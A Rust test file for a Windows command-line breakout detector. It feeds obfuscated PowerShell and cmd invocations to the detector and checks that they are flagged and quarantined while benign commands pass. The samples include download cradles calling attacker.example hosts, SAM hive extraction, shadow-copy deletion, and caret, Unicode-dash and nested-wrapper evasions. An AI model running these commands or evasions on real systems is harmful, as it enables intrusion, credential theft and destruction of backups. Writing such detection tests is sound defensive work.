//! Adversarial Command-Line Evasion Empirical Challenge Suite
//!
//! Stress-tests and challenges `crates/osoosi-agent-anomaly/src/command_line.rs`
//! and `TechnicalBreakoutGuard` against evasive attacks:
//! 1. Caret insertion (`c^m^d /c p^o^w^e^r^s^h^e^l^l -e^n^c <Base64>`)
//! 2. Unicode dashes (`\u{2013}`, `\u{2014}`, `\u{2015}`) with `-EncodedCommand` aliases
//! 3. Slash switch prefixes (`/e`, `/ec`, `/enc`, `/command`, `/enc:...`, `/ec=...`)
//! 4. Malformed Base64 (odd byte lengths, invalid characters, invalid padding, odd UTF-16LE byte counts)
//! 5. Deep nested wrappers (`cmd /c start cmd /c powershell -enc ...`) up to depth 4
//! 6. Obfuscated secondary payloads & dynamic evaluation cradles
//! 7. Benign invocations preserving clean posture (anti-false-positive guarantee)

use osoosi_agent_anomaly::breakout_defense::TechnicalBreakoutGuard;
use osoosi_agent_anomaly::command_line::{
    analyze_command_line, classify_ps_switch_name, decode_base64_strict, decode_encoded_command,
    encode_utf16le_base64, parse_powershell_args, strip_cmd_carets_outside_quotes,
    tokenize_windows_argv, EncodedCommandState, PsParameter,
};

/// Stage 2 reflective cradle payload
const STAGE2_DOWNLOAD_CRADLE: &str =
    "IEX (New-Object Net.WebClient).DownloadString('https://evil.attacker.example/stage2.ps1')";

/// Stage 2 reflective Base64 evaluation
const STAGE2_REFLECTIVE_B64: &str =
    "$b=[Convert]::FromBase64String('SUVYIChHZXQtRGF0ZSk='); iex ([Text.Encoding]::Unicode.GetString($b))";

/// Stage 2 SAM extraction payload
const STAGE2_SAM_EXTRACTION: &str = "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y";

/// Stage 2 Shadow copy deletion
const STAGE2_VSS_PURGE: &str = "vssadmin delete shadows /all /quiet";

// ============================================================================
// 1. Caret Insertion & Deobfuscation Evasion
// ============================================================================

#[test]
fn test_adversarial_caret_insertion_unwrapping() {
    let guard = TechnicalBreakoutGuard::new();
    let b64 = encode_utf16le_base64(STAGE2_DOWNLOAD_CRADLE);

    let caret_vectors = vec![
        // Carets in cmd binary name and powershell binary name
        format!("c^m^d /c p^o^w^e^r^s^h^e^l^l -e^n^c {}", b64),
        // Carets with full extensions
        format!("c^m^d^.^e^x^e /c p^o^w^e^r^s^h^e^l^l^.^e^x^e -e^n^c {}", b64),
        // Carets inside outer quotes in cmd /c
        format!("cmd.exe /c \"p^o^w^e^r^s^h^e^l^l -e^n^c {}\"", b64),
        // Carets in switches
        format!("powershell.exe -e^n^c {}", b64),
        format!("powershell.exe -e^c {}", b64),
        format!("powershell.exe -e^n^c^o^d^e^d^c^o^m^m^a^n^d {}", b64),
        format!("powershell.exe /e^n^c {}", b64),
        // Carets in hidden window and bypass switches
        "powershell.exe -w^i^n^d^o^w^s^t^y^l^e h^i^d^d^e^n -e^x^e^c^u^t^i^o^n^p^o^l^i^c^y b^y^p^a^s^s -c Get-Process".to_string(),
        // Carets in start wrapper
        format!("s^t^a^r^t /b c^m^d /c p^o^w^e^r^s^h^e^l^l -enc {}", b64),
        // Nested carets inside cmd /c wrapper
        format!("cmd.exe /c c^m^d /c p^o^w^e^r^s^h^e^l^l -e^n^c {}", b64),
    ];

    for (idx, cmd) in caret_vectors.iter().enumerate() {
        let parsed = analyze_command_line(cmd);
        let findings = parsed.collect_findings();
        assert!(
            parsed.has_breakout_signals(),
            "Vector #{}: Caret-obfuscated command must be detected: {}\nFindings: {:?}",
            idx,
            cmd,
            findings
        );

        let verdict = guard.evaluate_execution("cmd.exe", cmd);
        assert!(
            !verdict.is_clean && verdict.sandbox_quarantine_required,
            "Vector #{}: TechnicalBreakoutGuard must quarantine caret-obfuscated command: {}",
            idx,
            cmd
        );
    }
}

#[test]
fn test_strip_carets_unit_oracle() {
    assert_eq!(strip_cmd_carets_outside_quotes("c^m^d"), "cmd");
    assert_eq!(
        strip_cmd_carets_outside_quotes("p^o^w^e^r^s^h^e^l^l -e^n^c"),
        "powershell -enc"
    );
    // Carets inside double quotes must be preserved
    assert_eq!(
        strip_cmd_carets_outside_quotes(r#"cmd /c "powershell -enc ^test""#),
        r#"cmd /c "powershell -enc ^test""#
    );
    // Consecutive carets
    assert_eq!(strip_cmd_carets_outside_quotes("c^^m^^d"), "c^m^d");
    // Trailing caret
    assert_eq!(strip_cmd_carets_outside_quotes("cmd^"), "cmd");
}

// ============================================================================
// 2. Unicode Dashes & Prefixes Evasion
// ============================================================================

#[test]
fn test_adversarial_unicode_dashes_and_aliases() {
    let guard = TechnicalBreakoutGuard::new();
    let b64 = encode_utf16le_base64(STAGE2_DOWNLOAD_CRADLE);

    // Unicode dashes: \u{2013} (En Dash '–'), \u{2014} (Em Dash '—'), \u{2015} (Horizontal Bar '―')
    let dashes = ['\u{2013}', '\u{2014}', '\u{2015}'];
    let encoded_aliases = [
        "e",
        "ec",
        "en",
        "enc",
        "enco",
        "encod",
        "encode",
        "encoded",
        "encodedc",
        "encodedco",
        "encodedcom",
        "encodedcomm",
        "encodedcomma",
        "encodedcomman",
        "encodedcommand",
        // Case variations
        "EncodedCommand",
        "ENCODEDCOMMAND",
        "EnC",
        "eC",
        "E",
    ];

    for dash in dashes {
        for alias in encoded_aliases {
            let cmd_space = format!("powershell {}{} {}", dash, alias, b64);
            let parsed_space = analyze_command_line(&cmd_space);
            assert!(
                parsed_space.has_breakout_signals(),
                "Must detect Unicode dash '{}' with alias '{}': {}",
                dash,
                alias,
                cmd_space
            );
            let verdict_space = guard.evaluate_execution("powershell.exe", &cmd_space);
            assert!(
                !verdict_space.is_clean && verdict_space.sandbox_quarantine_required,
                "Must quarantine Unicode dash command: {}",
                cmd_space
            );

            // Also test colon-attached and equals-attached syntax: -enc:B64 or -enc=B64
            let cmd_colon = format!("powershell {}{}:{}", dash, alias, b64);
            let parsed_colon = analyze_command_line(&cmd_colon);
            assert!(
                parsed_colon.has_breakout_signals(),
                "Must detect colon-attached syntax with Unicode dash '{}' and alias '{}': {}",
                dash,
                alias,
                cmd_colon
            );

            let cmd_equal = format!("powershell {}{}={}", dash, alias, b64);
            let parsed_equal = analyze_command_line(&cmd_equal);
            assert!(
                parsed_equal.has_breakout_signals(),
                "Must detect equal-attached syntax with Unicode dash '{}' and alias '{}': {}",
                dash,
                alias,
                cmd_equal
            );
        }
    }
}

// ============================================================================
// 3. Slash Switch Prefixes Evasion
// ============================================================================

#[test]
fn test_adversarial_slash_switch_prefixes() {
    let guard = TechnicalBreakoutGuard::new();
    let b64 = encode_utf16le_base64(STAGE2_REFLECTIVE_B64);

    let slash_aliases = [
        "/e",
        "/ec",
        "/en",
        "/enc",
        "/enco",
        "/encod",
        "/encode",
        "/encoded",
        "/encodedcommand",
        "/EncodedCommand",
        "/E",
        "/EC",
        "/ENC",
    ];

    for alias in slash_aliases {
        let cmd = format!("powershell.exe {} {}", alias, b64);
        let parsed = analyze_command_line(&cmd);
        assert!(
            parsed.has_breakout_signals(),
            "Must detect slash switch prefix '{}': {}",
            alias,
            cmd
        );
        let verdict = guard.evaluate_execution("powershell.exe", &cmd);
        assert!(
            !verdict.is_clean && verdict.sandbox_quarantine_required,
            "Must quarantine slash switch command: {}",
            cmd
        );

        // Attached syntax
        let cmd_colon = format!("powershell.exe {}:{}", alias, b64);
        let parsed_colon = analyze_command_line(&cmd_colon);
        assert!(
            parsed_colon.has_breakout_signals(),
            "Must detect attached colon switch '{}': {}",
            alias,
            cmd_colon
        );

        let cmd_equal = format!("powershell.exe {}={}", alias, b64);
        let parsed_equal = analyze_command_line(&cmd_equal);
        assert!(
            parsed_equal.has_breakout_signals(),
            "Must detect attached equal switch '{}': {}",
            alias,
            cmd_equal
        );
    }

    // Slash command switch (/c, /command)
    let slash_cmd =
        "powershell.exe /c \"$b=[Convert]::FromBase64String('AAAA'); iex ([Text.Encoding]::Unicode.GetString($b))\""
            .to_string();
    let parsed_cmd = analyze_command_line(&slash_cmd);
    assert!(
        parsed_cmd.has_breakout_signals(),
        "Must detect /c with inline reflective evaluation: {}",
        slash_cmd
    );
}

// ============================================================================
// 4. Malformed Base64 & Failsafe Handling
// ============================================================================

#[test]
fn test_adversarial_malformed_base64_fails_closed() {
    let guard = TechnicalBreakoutGuard::new();

    let malformed_cases = vec![
        // Length not multiple of 4
        ("A", "Base64 length 1 is not a multiple of 4"),
        ("AA", "Base64 length 2 is not a multiple of 4"),
        ("AAA", "Base64 length 3 is not a multiple of 4"),
        ("AAAAA", "Base64 length 5 is not a multiple of 4"),
        ("AAAAAAA", "Base64 length 7 is not a multiple of 4"),
        // Invalid Base64 characters
        ("!!!not_base64!!!", "invalid Base64 byte"),
        ("@#$%^&*()_+!", "invalid Base64 byte"),
        ("AAAA!AAA", "invalid Base64 byte"),
        ("AAAA%AAA", "invalid Base64 byte"),
        // Invalid padding
        ("A===", "invalid Base64 padding placement"),
        ("AA=A", "unexpected '=' inside Base64 quantum"),
        ("A=AA", "unexpected '=' inside Base64 quantum"),
        ("A=A=", "unexpected '=' inside Base64 quantum"),
        ("====", "invalid Base64 padding placement"),
        ("AA==AAAA", "invalid Base64 padding placement"),
        // Odd UTF-16LE byte counts (Base64 is valid RFC 4648, but decodes to odd byte counts)
        // "AA==" decodes to 1 byte: 0x00
        (
            "AA==",
            "UTF-16LE payload byte length 1 must be non-empty and even",
        ),
        // "AQID" decodes to 3 bytes: [1, 2, 3]
        (
            "AQID",
            "UTF-16LE payload byte length 3 must be non-empty and even",
        ),
        // "AQIDBAU=" decodes to 5 bytes: [1, 2, 3, 4, 5]
        (
            "AQIDBAU=",
            "UTF-16LE payload byte length 5 must be non-empty and even",
        ),
        // Empty string
        ("", "empty Base64 payload"),
    ];

    for (bad_b64, expected_reason_sub) in &malformed_cases {
        let state = decode_encoded_command(bad_b64);
        match state {
            EncodedCommandState::MalformedBase64 {
                ref raw_base64,
                ref reason,
            } => {
                assert_eq!(raw_base64, bad_b64);
                assert!(
                    reason.contains(expected_reason_sub),
                    "Reason {:?} must contain expected substring {:?}",
                    reason,
                    expected_reason_sub
                );
            }
            other => panic!(
                "Payload {:?} must yield MalformedBase64, but yielded {:?}",
                bad_b64, other
            ),
        }

        // TechnicalBreakoutGuard must fail closed and quarantine
        let cmd = format!("powershell.exe -enc {}", bad_b64);
        let verdict = guard.evaluate_execution("powershell.exe", &cmd);
        assert!(
            !verdict.is_clean,
            "Malformed Base64 payload {:?} must NOT be clean: {:?}",
            bad_b64, verdict
        );
        assert!(
            verdict.sandbox_quarantine_required,
            "Malformed Base64 payload {:?} must require sandbox quarantine: {:?}",
            bad_b64, verdict
        );
    }
}

// ============================================================================
// 5. Deep Nested Wrappers (Up to Depth 4)
// ============================================================================

#[test]
fn test_adversarial_deep_nested_wrappers() {
    let guard = TechnicalBreakoutGuard::new();
    let b64 = encode_utf16le_base64(STAGE2_DOWNLOAD_CRADLE);

    let nested_vectors = vec![
        // Depth 1: cmd /c powershell -enc ...
        (1, format!("cmd.exe /c powershell.exe -enc {}", b64)),
        // Depth 2: cmd /c start cmd /c powershell -enc ...
        (
            2,
            format!("cmd.exe /c start cmd.exe /c powershell.exe -enc {}", b64),
        ),
        // Depth 3: cmd /c start /b cmd /k powershell /enc ...
        (
            3,
            format!(
                "cmd.exe /c start /b /wait cmd.exe /k powershell.exe /enc {}",
                b64
            ),
        ),
        // Depth 4: cmd /c start cmd /c start powershell -enc ... (reaches depth 4)
        (
            4,
            format!(
                "cmd.exe /c start cmd.exe /c start powershell.exe -enc {}",
                b64
            ),
        ),
        // Depth 2 with carets: c^m^d /c start /min c^m^d /c p^o^w^e^r^s^h^e^l^l -e^n^c ...
        (
            2,
            format!(
                "c^m^d.exe /c start /min c^m^d.exe /c p^o^w^e^r^s^h^e^l^l.exe -e^n^c {}",
                b64
            ),
        ),
    ];

    for (depth_level, cmd) in nested_vectors {
        let parsed = analyze_command_line(&cmd);
        let findings = parsed.collect_findings();
        assert!(
            parsed.has_breakout_signals(),
            "Depth {} nested wrapper must detect breakout: {}\nFindings: {:?}",
            depth_level,
            cmd,
            findings
        );

        let findings_str = findings.join(" | ");
        assert!(
            findings_str.contains("DownloadString") || findings_str.contains("-EncodedCommand"),
            "Depth {} findings must surface stage2 indicators: {}",
            depth_level,
            findings_str
        );

        let verdict = guard.evaluate_execution("cmd.exe", &cmd);
        assert!(
            !verdict.is_clean && verdict.sandbox_quarantine_required,
            "Depth {} nested wrapper must be quarantined: {}",
            depth_level,
            cmd
        );
    }
}

#[test]
fn test_adversarial_nested_encoded_payload_recursion() {
    let guard = TechnicalBreakoutGuard::new();

    // Stage 2: inner payload
    let stage2_script = STAGE2_SAM_EXTRACTION;
    let stage2_b64 = encode_utf16le_base64(stage2_script);

    // Stage 1: outer powershell script that invokes inner powershell with -enc stage2
    let stage1_script = format!("powershell.exe -NoProfile -enc {}", stage2_b64);
    let stage1_b64 = encode_utf16le_base64(&stage1_script);

    // Root command line
    let root_cmd = format!("cmd.exe /c powershell.exe -enc {}", stage1_b64);

    let parsed = analyze_command_line(&root_cmd);
    let findings = parsed.collect_findings();
    assert!(
        parsed.has_breakout_signals(),
        "Nested encoded payload recursion must be detected: {}\nFindings: {:?}",
        root_cmd,
        findings
    );

    let findings_str = findings.join(" | ");
    assert!(
        findings_str.contains("SAM registry hive extraction"),
        "Nested recursion must unwrap and detect SAM extraction in inner script: {}",
        findings_str
    );

    let verdict = guard.evaluate_execution("cmd.exe", &root_cmd);
    assert!(!verdict.is_clean && verdict.sandbox_quarantine_required);
}

// ============================================================================
// 6. Structural Script Body Analysis & Anti-Obfuscation
// ============================================================================

#[test]
fn test_script_body_structural_signals() {
    let guard = TechnicalBreakoutGuard::new();

    let payloads = vec![
        // Dynamic evaluation with backtick obfuscation: I`E`X
        (
            "powershell.exe -Command \"$b=[Convert]::FromBase64String('SUVY'); I`E`X ([Text.Encoding]::Unicode.GetString($b))\"",
            "FromBase64String + IEX",
        ),
        // ICM / Invoke-Command dynamic eval
        (
            "powershell.exe -Command \"$b=[Convert]::FromBase64String('SUVY'); icm ([scriptblock]::Create([Text.Encoding]::Unicode.GetString($b)))\"",
            "FromBase64String + IEX",
        ),
        // Invoke-WebRequest download cradle
        (
            "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://attacker.example/mal.ps1' | Invoke-Expression\"",
            "download cradle",
        ),
        // SAM extraction via reg save
        (
            "powershell.exe -Command \"reg save HKLM\\SAM C:\\Temp\\sam\"",
            "SAM registry hive extraction",
        ),
        // SAM extraction via direct copy
        (
            "powershell.exe -Command \"copy C:\\Windows\\System32\\config\\SAM C:\\Temp\\sam\"",
            "SAM registry hive extraction",
        ),
        // Shadow copy purge
        (
            "powershell.exe -Command \"vssadmin delete shadows /all /quiet\"",
            "Volume Shadow Copy manipulation",
        ),
        // Combined WindowStyle Hidden + ExecutionPolicy Bypass
        (
            "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Write-Host stealth\"",
            "combines -WindowStyle Hidden with -ExecutionPolicy Bypass",
        ),
    ];

    for (cmd, expected_sub) in payloads {
        let parsed = analyze_command_line(cmd);
        let findings_str = parsed.collect_findings().join(" | ");
        assert!(
            findings_str.contains(expected_sub) || parsed.has_breakout_signals(),
            "Command must trigger signal '{}': {}\nFindings: {}",
            expected_sub,
            cmd,
            findings_str
        );
        let verdict = guard.evaluate_execution("powershell.exe", cmd);
        assert!(
            !verdict.is_clean && verdict.sandbox_quarantine_required,
            "Command must be quarantined: {}",
            cmd
        );
    }
}

// ============================================================================
// 7. Benign Invocations Remain Clean (Anti-False-Positive Guarantee)
// ============================================================================

#[test]
fn test_benign_invocations_remain_clean() {
    let guard = TechnicalBreakoutGuard::new();

    let benign_commands = vec![
        "powershell.exe -Command Get-Date",
        "powershell.exe -Command \"Get-Process | Where-Object { $_.CPU -gt 10 }\"",
        "powershell.exe -File C:\\Scripts\\deploy.ps1",
        "powershell.exe -ExecutionPolicy RemoteSigned -File deploy.ps1",
        "powershell.exe -NoProfile -NonInteractive -Command Write-Output 'Clean test'",
        "cmd.exe /c dir C:\\Windows",
        "cmd.exe /c echo Hello World",
        "cmd.exe /c type C:\\build\\log.txt",
        "git.exe status",
        "cargo.exe test --offline",
    ];

    for cmd in benign_commands {
        let parsed = analyze_command_line(cmd);
        assert!(
            !parsed.has_breakout_signals(),
            "Benign command must NOT have breakout signals: {}\nFindings: {:?}",
            cmd,
            parsed.collect_findings()
        );

        let verdict = guard.evaluate_execution("cmd.exe", cmd);
        assert!(
            verdict.is_clean,
            "Benign command must remain clean without false positive: {}\nDetected: {:?}",
            cmd, verdict.detected_vectors
        );
        assert!(
            !verdict.sandbox_quarantine_required,
            "Benign command must NOT trigger quarantine: {}",
            cmd
        );
    }
}

// ============================================================================
// 8. Low-Level Tokenizer & Parser Oracles
// ============================================================================

#[test]
fn test_low_level_parser_oracles() {
    // 1. CommandLineToArgvW tokenizer oracle
    let tokens =
        tokenize_windows_argv(r#"cmd.exe /c "powershell.exe -enc AAAA" "arg with spaces""#);
    assert_eq!(
        tokens,
        vec![
            "cmd.exe",
            "/c",
            "powershell.exe -enc AAAA",
            "arg with spaces"
        ]
    );

    // 2. PowerShell switch classification oracle
    assert_eq!(classify_ps_switch_name("e"), "encodedcommand");
    assert_eq!(classify_ps_switch_name("ec"), "encodedcommand");
    assert_eq!(classify_ps_switch_name("en"), "encodedcommand");
    assert_eq!(classify_ps_switch_name("enc"), "encodedcommand");
    assert_eq!(classify_ps_switch_name("enco"), "encodedcommand");
    assert_eq!(classify_ps_switch_name("encodedcommand"), "encodedcommand");
    assert_eq!(classify_ps_switch_name("c"), "command");
    assert_eq!(classify_ps_switch_name("co"), "command");
    assert_eq!(classify_ps_switch_name("command"), "command");
    assert_eq!(classify_ps_switch_name("w"), "windowstyle");
    assert_eq!(classify_ps_switch_name("ep"), "executionpolicy");
    assert_eq!(classify_ps_switch_name("nop"), "noprofile");
    assert_eq!(classify_ps_switch_name("noni"), "noninteractive");
    assert_eq!(classify_ps_switch_name("unknown"), "other");

    // 3. PowerShell argument parser oracle
    let args = vec![
        "-nop".to_string(),
        "-w".to_string(),
        "hidden".to_string(),
        "-ep".to_string(),
        "bypass".to_string(),
        "-enc:AAAA".to_string(),
    ];
    let params = parse_powershell_args(&args);
    assert!(params.contains(&PsParameter::NoProfile));
    assert!(params.contains(&PsParameter::WindowStyle("hidden".to_string())));
    assert!(params.contains(&PsParameter::ExecutionPolicy("bypass".to_string())));
    assert!(params.contains(&PsParameter::EncodedCommand("AAAA".to_string())));

    // 4. Base64 strict decoder oracle
    let valid_b64 = "SGVsbG8=";
    assert_eq!(decode_base64_strict(valid_b64).unwrap(), b"Hello");
    assert!(decode_base64_strict("bad!").is_err());

    // 5. VSS Purge payload test
    let guard = TechnicalBreakoutGuard::new();
    let verdict = guard.evaluate_execution("powershell.exe -Command", STAGE2_VSS_PURGE);
    assert!(!verdict.is_clean && verdict.sandbox_quarantine_required);
}
